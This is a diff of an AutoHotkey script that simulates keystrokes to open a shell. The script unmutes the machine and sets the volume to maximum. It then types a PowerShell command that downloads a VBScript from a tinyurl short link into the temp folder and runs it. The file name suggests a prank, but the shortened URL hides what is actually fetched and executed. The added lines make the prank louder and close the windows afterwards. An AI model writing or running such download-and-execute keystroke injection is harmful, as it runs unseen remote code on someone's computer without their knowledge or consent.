@@ -20,8 +20,15 @@ Send {enter}
 Sleep 200
 Send {Shift}
 Sleep 200
-Send powershell (new-object System.Net.WebClient).DownloadFile('https://tinyurl.com/2fzp97ve','`%tmp`%\\rickU.vbs'); && start `%tmp`%\\rickU.vbs
+SoundGet, MuteState, Master, Mute
+if MuteState=On 
+{
+	send {Volume_Mute}
+}
+SoundSet, 100
+Send powershell (new-object System.Net.WebClient).DownloadFile('https://tinyurl.com/2fzp97ve','`%tmp`%\\rickU.vbs'); && start `%tmp`%\\rickU.vbs && exit
 Send {enter}
+ExitApp
 ; Send del `%tmp`%\rickyou.vbs
 ; Send {enter}
 ; Sleep 200
